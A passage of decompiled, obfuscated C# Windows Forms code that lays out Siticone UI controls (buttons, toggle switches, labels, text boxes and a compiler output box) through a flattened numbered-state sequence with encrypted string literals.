					siticoneButton2.PressedColor = System.Drawing.Color.Azure;
					num = 401;
				}
				if (num == 155)
				{
					tabPage1.Controls.Add(siticoneTextBox2);
					num = 156;
				}
				if (num == 578)
				{
					base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
					num = 579;
				}
				if (num == 473)
				{
					tabPage3.Text = <Module>.Decrypt("COACdD1+ntdiEVVmYZDqHg==");
					num = 474;
				}
				if (num == 382)
				{
					siticoneOSToggleSwith1.Size = new System.Drawing.Size(62, 24);
					num = 383;
				}
				if (num == 72)
				{
					ReceiveBtn.ForeColor = System.Drawing.Color.Gray;
					num = 73;
				}
				if (num == 236)
				{
					siticoneHtmlLabel13.TabIndex = 83;
					num = 237;
				}
				if (num == 298)
				{
					siticoneOSToggleSwith6.TabIndex = 74;
					num = 299;
				}
				if (num == 399)
				{
					siticoneButton2.Name = <Module>.Decrypt("AlCFyt4nDj9Z/suPr0YdIw==");
					num = 400;
				}
				if (num == 349)
				{
					siticoneHtmlLabel5.Text = <Module>.Decrypt("Rry2+IVVrkRpSCqXxwf9zg==");
					num = 350;
				}
				if (num == 177)
				{
					siticoneRoundedButton1.Location = new System.Drawing.Point(130, 302);
					num = 178;
				}
				if (num == 312)
				{
					siticoneOSToggleSwith5.TabIndex = 72;
					num = 313;
				}
				if (num == 521)
				{
					siticoneTextBox1.ForeColor = System.Drawing.Color.White;
					num = 522;
				}
				if (num == 135)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel12);
					num = 136;
				}
				if (num == 271)
				{
					siticoneOSToggleSwith8.Text = <Module>.Decrypt("HFOv+WDvsxqAa5dZXKMR0A==");
					num = 272;
				}
				if (num == 22)
				{
					siticoneOSToggleSwith5 = new ns1.SiticoneOSToggleSwith();
					num = 23;
				}
				if (num == 66)
				{
					ReceiveBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
					num = 67;
				}
				if (num == 577)
				{
					base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
					num = 578;
				}
				if (num == 529)
				{
					siticoneTextBox1.PlaceholderText = <Module>.Decrypt("sV2kEmRpbU6wWdFUj1o+EA==");
					num = 530;
				}
				if (num == 601)
				{
					((System.ComponentModel.ISupportInitialize)siticonePictureBox1).EndInit();
					num = 602;
				}
				if (num == 25)
				{
					siticoneOSToggleSwith4 = new ns1.SiticoneOSToggleSwith();
					num = 26;
				}
				if (num == 211)
				{
					siticoneTextBox3.FocusedState.Parent = siticoneTextBox3;
					num = 212;
				}
				if (num == 559)
				{
					siticonePictureBox1.ImageRotate = 0f;
					num = 560;
				}
				if (num == 454)
				{
					siticoneHtmlLabel22.Location = new System.Drawing.Point(98, 64);
					num = 455;
				}
				if (num == 219)
				{
					siticoneTextBox3.Name = <Module>.Decrypt("BqL6kdsjQmOiM6YK1F0woY5UvMVRjVQsV/vlh8rtOBI=");
					num = 220;
				}
				if (num == 45)
				{
					siticoneControlBox1 = new Siticone.Desktop.UI.WinForms.SiticoneControlBox();
					num = 46;
				}
				if (num == 60)
				{
					ReceiveBtn.Cursor = System.Windows.Forms.Cursors.Hand;
					num = 61;
				}
				if (num == 428)
				{
					siticoneTextBox2.PlaceholderText = <Module>.Decrypt("VwpqgXblUcxoKMsLy220Bw==");
					num = 429;
				}
				if (num == 324)
				{
					siticoneHtmlLabel7.Text = <Module>.Decrypt("Rn1z/tr0teJl+7RJ/Xe9DhcClyuGoa5tLDhrpISK8qAE00QyFosF7klkDcPwVdq9");
					num = 325;
				}
				if (num == 345)
				{
					siticoneHtmlLabel5.Location = new System.Drawing.Point(98, 200);
					num = 346;
				}
				if (num == 196)
				{
					siticoneOSToggleSwith11.TabIndex = 85;
					num = 197;
				}
				if (num == 583)
				{
					base.Controls.Add(siticoneHtmlLabel1);
					num = 584;
				}
				if (num == 479)
				{
					siticoneButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
					num = 480;
				}
				if (num == 119)
				{
					siticonePanel1.Size = new System.Drawing.Size(850, 422);
					num = 120;
				}
				if (num == 302)
				{
					siticoneHtmlLabel8.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 303;
				}
				if (num == 301)
				{
					siticoneHtmlLabel8.Enabled = false;
					num = 302;
				}
				if (num == 496)
				{
					compilerOutputTextBox.BackColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 497;
				}
				if (num == 338)
				{
					siticoneOSToggleSwith4.Text = <Module>.Decrypt("YWh+wq1ZBZFESnGwxJtE0w==");
					num = 339;
				}
				if (num == 490)
				{
					siticoneButton1.PressedColor = System.Drawing.Color.Azure;
					num = 491;
				}
				if (num == 78)
				{
					ReceiveBtn.Name = <Module>.Decrypt("meNzhYO9zwd+UvE2+1WgHw==");
					num = 79;
				}
				if (num == 495)
				{
					siticoneButton1.Click += new System.EventHandler(siticoneButton1_Click);
					num = 496;
				}
				if (num == 599)
				{
					tabPage3.ResumeLayout(false);
					num = 600;
				}
				if (num == 330)
				{
					siticoneHtmlLabel6.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7//5CYmokg+XPDo2CjpBHUU8=");
					num = 331;
				}
				if (num == 546)
				{
					siticoneHtmlLabel1.BackColor = System.Drawing.Color.Transparent;
					num = 547;
				}
				if (num == 488)
				{
					siticoneButton1.Location = new System.Drawing.Point(32, 314);
					num = 489;
				}
				if (num == 107)
				{
					HistoryBtn.Location = new System.Drawing.Point(271, 8);
					num = 108;
				}
				if (num == 597)
				{
					tabPage1.ResumeLayout(false);
					num = 598;
				}
				if (num == 464)
				{
					tabPage3.BackColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 465;
				}
				if (num == 283)
				{
					siticoneOSToggleSwith7.Size = new System.Drawing.Size(62, 24);
					num = 284;
				}
				if (num == 154)
				{
					tabPage1.Controls.Add(siticoneButton2);
					num = 155;
				}
				if (num == 487)
				{
					siticoneButton1.HoverState.Parent = siticoneButton1;
					num = 488;
				}
				if (num == 272)
				{
					siticoneHtmlLabel10.BackColor = System.Drawing.Color.Transparent;
					num = 273;
				}
				if (num == 73)
				{
					ReceiveBtn.HoverState.CustomBorderColor = System.Drawing.Color.White;
					num = 74;
				}
				if (num == 536)
				{
					siticoneTextBox1.TextChanged += new System.EventHandler(siticoneTextBox1_TextChanged);
					num = 537;
				}
				if (num == 163)
				{
					tabPage1.Size = new System.Drawing.Size(862, 410);
					num = 164;
				}
				if (num == 317)
				{
					siticoneHtmlLabel7.Enabled = false;
					num = 318;
				}
				if (num == 215)
				{
					siticoneTextBox3.HoverState.ForeColor = System.Drawing.Color.White;
					num = 216;
				}
				if (num == 221)
				{
					siticoneTextBox3.PlaceholderText = <Module>.Decrypt("lW5+3YpFdntp4oBH6nxbcA==");
					num = 222;
				}
				if (num == 57)
				{
					ReceiveBtn.CheckedState.FillColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 58;
				}
				if (num == 321)
				{
					siticoneHtmlLabel7.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7//wdLGtTFCnEnUl/Co+8C2c=");
					num = 322;
				}
				if (num == 359)
				{
					siticoneHtmlLabel4.Location = new System.Drawing.Point(98, 166);
					num = 360;
				}
				if (num == 114)
				{
					HistoryBtn.Click += new System.EventHandler(HistoryBtn_Click);
					num = 115;
				}
				if (num == 75)
				{
					ReceiveBtn.HoverState.ForeColor = System.Drawing.Color.White;
					num = 76;
				}
				if (num == 485)
				{
					siticoneButton1.Font = new System.Drawing.Font(<Module>.Decrypt("92SXtmBZ4BKsPOXKa+Z4EA=="), 9f);
					num = 486;
				}
				if (num == 176)
				{
					siticoneRoundedButton1.HoverState.Parent = siticoneRoundedButton1;
					num = 177;
				}
				if (num == 498)
				{
					compilerOutputTextBox.Font = new System.Drawing.Font(<Module>.Decrypt("92SXtmBZ4BKsPOXKa+Z4EA=="), 12f, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Pixel);
					num = 499;
				}
				if (num == 507)
				{
					siticoneTextBox1.Animated = true;
					num = 508;
				}
				if (num == 282)
				{
					siticoneOSToggleSwith7.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/3Ai4jgzywHynt8hWl7YeBE=");
					num = 283;
				}
				if (num == 242)
				{
					siticoneOSToggleSwith10.Text = <Module>.Decrypt("HFOv+WDvsxqAa5dZXKMR0A==");
					num = 243;
				}
				if (num == 81)
				{
					ReceiveBtn.Size = new System.Drawing.Size(154, 45);
					num = 82;
				}
				if (num == 448)
				{
					siticoneOSToggleSwith20.Text = <Module>.Decrypt("YWh+wq1ZBZFESnGwxJtE0w==");
					num = 449;
				}
				if (num == 461)
				{
					siticoneOSToggleSwith21.Size = new System.Drawing.Size(62, 24);
					num = 462;
				}
				if (num == 437)
				{
					siticoneHtmlLabel21.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 438;
				}
				if (num == 430)
				{
					siticoneTextBox2.ShadowDecoration.Parent = siticoneTextBox2;
					num = 431;
				}
				if (num == 416)
				{
					siticoneTextBox2.FillColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 417;
				}
				if (num == 315)
				{
					siticoneOSToggleSwith5.Click += new System.EventHandler(siticoneOSToggleSwith5_Click);
					num = 316;
				}
				if (num == 549)
				{
					siticoneHtmlLabel1.ForeColor = System.Drawing.Color.White;
					num = 550;
				}
				if (num == 250)
				{
					siticoneHtmlLabel12.Size = new System.Drawing.Size(42, 20);
					num = 251;
				}
				if (num == 432)
				{
					siticoneTextBox2.Style = Siticone.Desktop.UI.WinForms.Enums.TextBoxStyle.Material;
					num = 433;
				}
				if (num == 522)
				{
					siticoneTextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(10, 14, 31);
					num = 523;
				}
				if (num == 286)
				{
					siticoneHtmlLabel9.BackColor = System.Drawing.Color.Transparent;
					num = 287;
				}
				if (num == 10)
				{
					siticoneTextBox3 = new Siticone.Desktop.UI.WinForms.SiticoneTextBox();
					num = 11;
				}
				if (num == 564)
				{
					siticonePictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
					num = 565;
				}
				if (num == 460)
				{
					siticoneOSToggleSwith21.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/8UV4KyDHbgoDFyptzQHq3I=");
					num = 461;
				}
				if (num == 493)
				{
					siticoneButton1.TabIndex = 18;
					num = 494;
				}
				if (num == 51)
				{
					SuspendLayout();
					num = 52;
				}
				if (num == 506)
				{
					compilerOutputTextBox.Text = <Module>.Decrypt("oHGOXXw4oyHojQfqg/ypK6YoZZesQBYqUQ9epKrpESQ=");
					num = 507;
				}
				if (num == 553)
				{
					siticoneHtmlLabel1.TabIndex = 11;
					num = 554;
				}
				if (num == 533)
				{
					siticoneTextBox1.Style = Siticone.Desktop.UI.WinForms.Enums.TextBoxStyle.Material;
					num = 534;
				}
				if (num == 232)
				{
					siticoneHtmlLabel13.ForeColor = System.Drawing.Color.White;
					num = 233;
				}
				if (num == 230)
				{
					siticoneHtmlLabel13.Enabled = false;
					num = 231;
				}
				if (num == 371)
				{
					siticoneHtmlLabel3.BackColor = System.Drawing.Color.Transparent;
					num = 372;
				}
				if (num == 308)
				{
					siticoneHtmlLabel8.Text = <Module>.Decrypt("zZfNnsE856I+QZeMV/TdjjA9N6lV32BpL9HyUXR4EqI=");
					num = 309;
				}
				if (num == 20)
				{
					siticoneOSToggleSwith6 = new ns1.SiticoneOSToggleSwith();
					num = 21;
				}
				if (num == 377)
				{
					siticoneHtmlLabel3.Size = new System.Drawing.Size(207, 20);
					num = 378;
				}
				if (num == 499)
				{
					compilerOutputTextBox.ForeColor = System.Drawing.SystemColors.WindowFrame;
					num = 500;
				}
				if (num == 524)
				{
					siticoneTextBox1.HoverState.Parent = siticoneTextBox1;
					num = 525;
				}
				if (num == 87)
				{
					HistoryBtn.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 88;
				}
				if (num == 44)
				{
					siticonePictureBox1 = new Siticone.Desktop.UI.WinForms.SiticonePictureBox();
					num = 45;
				}
				if (num == 342)
				{
					siticoneHtmlLabel5.Enabled = false;
					num = 343;
				}
				if (num == 224)
				{
					siticoneTextBox3.ShadowDecoration.Parent = siticoneTextBox3;
					num = 225;
				}
				if (num == 512)
				{
					siticoneTextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
					num = 513;
				}
				if (num == 332)
				{
					siticoneHtmlLabel6.TabIndex = 70;
					num = 333;
				}
				if (num == 228)
				{
					siticoneTextBox3.TextOffset = new System.Drawing.Point(10, 0);
					num = 229;
				}
				if (num == 297)
				{
					siticoneOSToggleSwith6.Size = new System.Drawing.Size(62, 24);
					num = 298;
				}
				if (num == 500)
				{
					compilerOutputTextBox.Location = new System.Drawing.Point(32, 80);
					num = 501;
				}
				if (num == 74)
				{
					ReceiveBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 75;
				}
				if (num == 515)
				{
					siticoneTextBox1.DisabledState.Parent = siticoneTextBox1;
					num = 516;
				}
				if (num == 197)
				{
					siticoneOSToggleSwith11.Text = <Module>.Decrypt("HFOv+WDvsxqAa5dZXKMR0A==");
					num = 198;
				}
				if (num == 251)
				{
					siticoneHtmlLabel12.TabIndex = 81;
					num = 252;
				}
				if (num == 501)
				{
					compilerOutputTextBox.Multiline = true;
					num = 502;
				}
				if (num == 188)
				{
					siticoneHtmlLabel14.Location = new System.Drawing.Point(98, 302);
					num = 189;
				}
				if (num == 48)
				{
					tabPage1.SuspendLayout();
					num = 49;
				}
				if (num == 594)
				{
					base.Layout += new System.Windows.Forms.LayoutEventHandler(s);
					num = 595;
				}
				if (num == 274)
				{
					siticoneHtmlLabel10.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 275;
				}
				if (num == 291)
				{
					siticoneHtmlLabel9.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/+0hDd3P3+G9NCPzUvWl9hA=");
					num = 292;
				}
				if (num == 406)
				{
					siticoneTextBox2.Animated = true;
					num = 407;
				}
				if (num == 355)
				{
					siticoneHtmlLabel4.BackColor = System.Drawing.Color.Transparent;
					num = 356;
				}
				if (num == 558)
				{
					siticonePictureBox1.Image = (System.Drawing.Image)resources.GetObject(<Module>.Decrypt("gQnngqRlii6GSztZWPazHO0ToHoIaG3SFINmkUaNF4k="));
					num = 559;
				}
				if (num == 431)
				{
					siticoneTextBox2.Size = new System.Drawing.Size(618, 36);
					num = 432;
				}
				if (num == 161)
				{
					tabPage1.Name = <Module>.Decrypt("WoPYAT8GyuHPKBC3L1l13Q==");
					num = 162;
				}
				if (num == 246)
				{
					siticoneHtmlLabel12.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 247;
				}
				if (num == 139)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel10);
					num = 140;
				}
				if (num == 426)
				{
					siticoneTextBox2.Name = <Module>.Decrypt("sy20JDyjIc1gPaIPv6/MvhVExd5g9t/hxcUI8iPqeRI=");
					num = 427;
				}
				if (num == 3)
				{
					HistoryBtn = new Siticone.Desktop.UI.WinForms.SiticoneButton();
					num = 4;
				}
				if (num == 289)
				{
					siticoneHtmlLabel9.ForeColor = System.Drawing.Color.White;
					num = 290;
				}
				if (num == 351)
				{
					siticoneOSToggleSwith3.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/6A7BIqa/Q5WpQWhOzdn1jA=");
					num = 352;
				}
				if (num == 527)
				{
					siticoneTextBox1.Name = <Module>.Decrypt("URwYQsH5u5kbGg4Io3Fn0TJbDV9NtwbRKH6mFVSz0TQ=");
					num = 528;
				}
				if (num == 166)
				{
					siticoneRoundedButton1.BorderRadius = 9;
					num = 167;
				}
				if (num == 214)
				{
					siticoneTextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(10, 14, 31);
					num = 215;
				}
				if (num == 563)
				{
					siticonePictureBox1.Size = new System.Drawing.Size(30, 30);
					num = 564;
				}
				if (num == 49)
				{
					tabPage3.SuspendLayout();
					num = 50;
				}
				if (num == 311)
				{
					siticoneOSToggleSwith5.Size = new System.Drawing.Size(62, 24);
					num = 312;
				}
				if (num == 538)
				{
					siticoneHtmlLabel2.Enabled = false;
					num = 539;
				}
				if (num == 9)
				{
					siticoneOSToggleSwith11 = new ns1.SiticoneOSToggleSwith();
					num = 10;
				}
				if (num == 444)
				{
					siticoneOSToggleSwith20.Location = new System.Drawing.Point(34, 96);
					num = 445;
				}
				if (num == 24)
				{
					siticoneHtmlLabel6 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 25;
				}
				if (num == 194)
				{
					siticoneOSToggleSwith11.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/8IGE6H1Z+ERIEIdwKXXHUc=");
					num = 195;
				}
				if (num == 140)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith7);
					num = 141;
				}
				if (num == 383)
				{
					siticoneOSToggleSwith1.TabIndex = 63;
					num = 384;
				}
				if (num == 136)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith9);
					num = 137;
				}
				if (num == 93)
				{
					HistoryBtn.CustomImages.Parent = HistoryBtn;
					num = 94;
				}
				if (num == 544)
				{
					siticoneHtmlLabel2.TabIndex = 12;
					num = 545;
				}
				if (num == 7)
				{
					siticoneRoundedButton1 = new Siticone.Desktop.UI.WinForms.SiticoneRoundedButton();
					num = 8;
				}
				if (num == 326)
				{
					siticoneHtmlLabel6.Enabled = false;
					num = 327;
				}
				if (num == 32)
				{
					siticoneButton2 = new Siticone.Desktop.UI.WinForms.SiticoneButton();
					num = 33;
				}
				if (num == 255)
				{
					siticoneOSToggleSwith9.Size = new System.Drawing.Size(62, 24);
					num = 256;
				}
				if (num == 571)
				{
					siticoneControlBox1.IconColor = System.Drawing.Color.White;
					num = 572;
				}
				if (num == 91)
				{
					HistoryBtn.Cursor = System.Windows.Forms.Cursors.Hand;
					num = 92;
				}
				if (num == 447)
				{
					siticoneOSToggleSwith20.TabIndex = 59;
					num = 448;
				}
				if (num == 264)
				{
					siticoneHtmlLabel11.Size = new System.Drawing.Size(66, 20);
					num = 265;
				}
				if (num == 191)
				{
					siticoneHtmlLabel14.TabIndex = 86;
					num = 192;
				}
				if (num == 410)
				{
					siticoneTextBox2.DefaultText = <Module>.Decrypt("39GqrqV6MsAl5Qp2e6EHeg==");
					num = 411;
				}
				if (num == 395)
				{
					siticoneButton2.Font = new System.Drawing.Font(<Module>.Decrypt("92SXtmBZ4BKsPOXKa+Z4EA=="), 9f);
					num = 396;
				}
				if (num == 310)
				{
					siticoneOSToggleSwith5.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/2JCVF4y+evmxX8Oi3QN6o4=");
					num = 311;
				}
				if (num == 492)
				{
					siticoneButton1.Size = new System.Drawing.Size(808, 50);
					num = 493;
				}
				if (num == 85)
				{
					HistoryBtn.Animated = true;
					num = 86;
				}
				if (num == 318)
				{
					siticoneHtmlLabel7.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 319;
				}
				if (num == 156)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel21);
					num = 157;
				}
				if (num == 40)
				{
					compilerOutputTextBox = new System.Windows.Forms.TextBox();
					num = 41;
				}
				if (num == 167)
				{
					siticoneRoundedButton1.CheckedState.Parent = siticoneRoundedButton1;
					num = 168;
				}
				if (num == 339)
				{
					siticoneOSToggleSwith4.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith4_CheckedChanged);
					num = 340;
				}
				if (num == 600)
				{
					tabPage3.PerformLayout();
					num = 601;
				}
				if (num == 120)
				{
					siticonePanel1.TabIndex = 9;
					num = 121;
				}
				if (num == 319)
				{
					siticoneHtmlLabel7.ForeColor = System.Drawing.Color.White;
					num = 320;
				}
				if (num == 62)
				{
					ReceiveBtn.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 0, 2);
					num = 63;
				}
				if (num == 545)
				{
					siticoneHtmlLabel2.Text = <Module>.Decrypt("EeW6jOy8mCeA4qxSnmn4/g==");
					num = 546;
				}
				if (num == 70)
				{
					ReceiveBtn.FocusedColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 71;
				}
				if (num == 442)
				{
					siticoneHtmlLabel21.TabIndex = 60;
					num = 443;
				}
				if (num == 603)
				{
					PerformLayout();
					num = 604;
				}
				if (num == 348)
				{
					siticoneHtmlLabel5.TabIndex = 68;
					num = 349;
				}
				if (num == 38)
				{
					tabPage3 = new System.Windows.Forms.TabPage();
					num = 39;
				}
				if (num == 584)
				{
					base.Controls.Add(siticonePictureBox1);
					num = 585;
				}
				if (num == 466)
				{
					tabPage3.Controls.Add(compilerOutputTextBox);
					num = 467;
				}
				if (num == 474)
				{
					siticoneButton1.BorderColor = System.Drawing.Color.Beige;
					num = 475;
				}
				if (num == 46)
				{
					siticonePanel1.SuspendLayout();
					num = 47;
				}
				if (num == 361)
				{
					siticoneHtmlLabel4.Size = new System.Drawing.Size(227, 20);
					num = 362;
				}
				if (num == 497)
				{
					compilerOutputTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
					num = 498;
				}
				if (num == 179)
				{
					siticoneRoundedButton1.ShadowDecoration.Parent = siticoneRoundedButton1;
					num = 180;
				}
				if (num == 433)
				{
					siticoneTextBox2.TabIndex = 61;
					num = 434;
				}
				if (num == 404)
				{
					siticoneButton2.Text = <Module>.Decrypt("MFlbojmn/cnAe1+38nFB/w==");
					num = 405;
				}
				if (num == 587)
				{
					base.Controls.Add(HistoryBtn);
					num = 588;
				}
				if (num == 421)
				{
					siticoneTextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(10, 14, 31);
					num = 422;
				}
				if (num == 452)
				{
					siticoneHtmlLabel22.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 453;
				}
				if (num == 146)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel6);
					num = 147;
				}
				if (num == 47)
				{
					tabControl1.SuspendLayout();
					num = 48;
				}
				if (num == 52)
				{
					ReceiveBtn.Animated = true;
					num = 53;
				}
				if (num == 97)
				{
					HistoryBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
					num = 98;
				}
				if (num == 354)
				{
					siticoneOSToggleSwith3.Text = <Module>.Decrypt("YWh+wq1ZBZFESnGwxJtE0w==");
					num = 355;
				}
				if (num == 124)
				{
					tabControl1.Name = <Module>.Decrypt("aoR9kaSBHv+6KJ735XC8RA==");
					num = 125;
				}
				if (num == 16)
				{
					siticoneOSToggleSwith8 = new ns1.SiticoneOSToggleSwith();
					num = 17;
				}
				if (num == 68)
				{
					ReceiveBtn.DisabledState.Parent = ReceiveBtn;
					num = 69;
				}
				if (num == 89)
				{
					HistoryBtn.CheckedState.ForeColor = System.Drawing.Color.White;
					num = 90;
				}
				if (num == 131)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith11);
					num = 132;
				}
				if (num == 401)
				{
					siticoneButton2.ShadowDecoration.Parent = siticoneButton2;
					num = 402;
				}
				if (num == 110)
				{
					HistoryBtn.ShadowDecoration.Parent = HistoryBtn;
					num = 111;
				}
				if (num == 152)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel3);
					num = 153;
				}
				if (num == 516)
				{
					siticoneTextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
					num = 517;
				}
				if (num == 294)
				{
					siticoneHtmlLabel9.Text = <Module>.Decrypt("jus26NT4kZuZPxw2utbh7Q==");
					num = 295;
				}
				if (num == 337)
				{
					siticoneOSToggleSwith4.TabIndex = 69;
					num = 338;
				}
				if (num == 96)
				{
					HistoryBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
					num = 97;
				}
				if (num == 129)
				{
					tabPage1.Controls.Add(siticoneRoundedButton1);
					num = 130;
				}
				if (num == 235)
				{
					siticoneHtmlLabel13.Size = new System.Drawing.Size(70, 20);
					num = 236;
				}
				if (num == 262)
				{
					siticoneHtmlLabel11.Location = new System.Drawing.Point(424, 134);
					num = 263;
				}
				if (num == 175)
				{
					siticoneRoundedButton1.ForeColor = System.Drawing.Color.White;
					num = 176;
				}
				if (num == 180)
				{
					siticoneRoundedButton1.Size = new System.Drawing.Size(38, 20);
					num = 181;
				}
				if (num == 202)
				{
					siticoneTextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
					num = 203;
				}
				if (num == 590)
				{
					Text = <Module>.Decrypt("spR45aAWCf/MBwbZwG8f9Q==");
					num = 591;
				}
				if (num == 277)
				{
					siticoneHtmlLabel10.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/83owYT0saHTJtpb2FqsMeo=");
					num = 278;
				}
				if (num == 101)
				{
					HistoryBtn.Font = new System.Drawing.Font(<Module>.Decrypt("rnvZW636ftbFMZ5/6hyYbGx58t85GJlQ2ZdxuzSyGQA="), 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
					num = 102;
				}
				if (num == 237)
				{
					siticoneHtmlLabel13.Text = <Module>.Decrypt("OVzqclqlYY9npvBKRwXjUA==");
					num = 238;
				}
				if (num == 552)
				{
					siticoneHtmlLabel1.Size = new System.Drawing.Size(48, 23);
					num = 553;
				}
				if (num == 55)
				{
					ReceiveBtn.ButtonMode = Siticone.Desktop.UI.WinForms.Enums.ButtonMode.RadioButton;
					num = 56;
				}
				if (num == 333)
				{
					siticoneHtmlLabel6.Text = <Module>.Decrypt("SNtcYJe703RrSEaAiiJmDFyQ5GmNY3C+deh9ogzO2DU=");
					num = 334;
				}
				if (num == 440)
				{
					siticoneHtmlLabel21.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/7y2YBcBILcB5elrIRpP7/Y=");
					num = 441;
				}
				if (num == 528)
				{
					siticoneTextBox1.PasswordChar = '\0';
					num = 529;
				}
				if (num == 470)
				{
					tabPage3.Padding = new System.Windows.Forms.Padding(3);
					num = 471;
				}
				if (num == 6)
				{
					tabPage1 = new System.Windows.Forms.TabPage();
					num = 7;
				}
				if (num == 443)
				{
					siticoneHtmlLabel21.Text = <Module>.Decrypt("9pX5BiFKRhe/OtOJn47I+lMHPZAJnmso0Q/Gdzlb7cg=");
					num = 444;
				}
				if (num == 284)
				{
					siticoneOSToggleSwith7.TabIndex = 76;
					num = 285;
				}
				if (num == 23)
				{
					siticoneHtmlLabel7 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 24;
				}
				if (num == 576)
				{
					siticoneControlBox1.TabIndex = 13;
					num = 577;
				}
				if (num == 245)
				{
					siticoneHtmlLabel12.Enabled = false;
					num = 246;
				}
				if (num == 65)
				{
					ReceiveBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
					num = 66;
				}
				if (num == 575)
				{
					siticoneControlBox1.Size = new System.Drawing.Size(36, 34);
					num = 576;
				}
				if (num == 560)
				{
					siticonePictureBox1.Location = new System.Drawing.Point(9, 20);
					num = 561;
				}
				if (num == 409)
				{
					siticoneTextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
					num = 410;
				}
				if (num == 358)
				{
					siticoneHtmlLabel4.ForeColor = System.Drawing.Color.White;
					num = 359;
				}
				if (num == 170)
				{
					siticoneRoundedButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
					num = 171;
				}
				if (num == 531)
				{
					siticoneTextBox1.ShadowDecoration.Parent = siticoneTextBox1;
					num = 532;
				}
				if (num == 133)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel13);
					num = 134;
				}
				if (num == 390)
				{
					siticoneButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
					num = 391;
				}
				if (num == 467)
				{
					tabPage3.Controls.Add(siticoneTextBox1);
					num = 468;
				}
				if (num == 483)
				{
					siticoneButton1.DisabledState.Parent = siticoneButton1;
					num = 484;
				}
				if (num == 413)
				{
					siticoneTextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
					num = 414;
				}
				if (num == 142)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith6);
					num = 143;
				}
				if (num == 336)
				{
					siticoneOSToggleSwith4.Size = new System.Drawing.Size(62, 24);
					num = 337;
				}
				if (num == 128)
				{
					tabPage1.BackColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 129;
				}
				if (num == 50)
				{
					((System.ComponentModel.ISupportInitialize)siticonePictureBox1).BeginInit();
					num = 51;
				}
				if (num == 369)
				{
					siticoneOSToggleSwith2.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith2_CheckedChanged);
					num = 370;
				}
				if (num == 535)
				{
					siticoneTextBox1.TextOffset = new System.Drawing.Point(10, 0);
					num = 536;
				}
				if (num == 239)
				{
					siticoneOSToggleSwith10.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/1yv/BhY1ixBE4DnuIiEIvg=");
					num = 240;
				}
				if (num == 61)
				{
					ReceiveBtn.CustomBorderColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 62;
				}
				if (num == 182)
				{
					siticoneRoundedButton1.Text = <Module>.Decrypt("p8ECTyZBoNhvtjq/5WUt+A==");
					num = 183;
				}
				if (num == 436)
				{
					siticoneHtmlLabel21.Enabled = false;
					num = 437;
				}
				if (num == 526)
				{
					siticoneTextBox1.Location = new System.Drawing.Point(32, 34);
					num = 527;
				}
				if (num == 329)
				{
